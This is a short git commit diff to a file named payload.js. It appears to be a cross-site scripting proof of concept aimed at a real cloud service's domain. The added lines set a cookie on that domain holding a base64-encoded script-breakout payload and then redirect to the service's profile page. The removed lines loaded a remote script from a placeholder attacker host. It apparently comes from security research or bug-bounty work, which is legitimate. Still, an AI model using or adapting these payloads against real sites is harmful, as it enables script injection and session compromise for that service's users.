5e52d85faf123e33fde3426c0db240d25da607e8
Khrish <106378292+Dev-Khrish@users.noreply.github.com>
2025-11-25 11:31:24 +0530

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,12 +1,7 @@
-// document.body.innerHTML = `
-//     <button onclick="go()">Click Me</button>
-// `;
-// function go() {
-//     document.cookie = "vulnerableCookie=LS0+PC9zY3JpcHQ+PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOy8vIA==; path=/; domain=.elastic.co;";
-//     window.location = "https://cloud.elastic.co/user/settings/profile";
-// }
-
-
-var s = document.createElement("script");
-s.src = "http://yourhost/xss.js";
-document.body.appendChild(s);
+document.body.innerHTML = `
+    <button onclick="go()">Click Me</button>
+`;
+function go() {
+    document.cookie = "vulnerableCookie=LS0+PC9zY3JpcHQ+PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOy8vIA==; path=/; domain=.elastic.co;";
+    window.location = "https://cloud.elastic.co/user/settings/profile";
+}
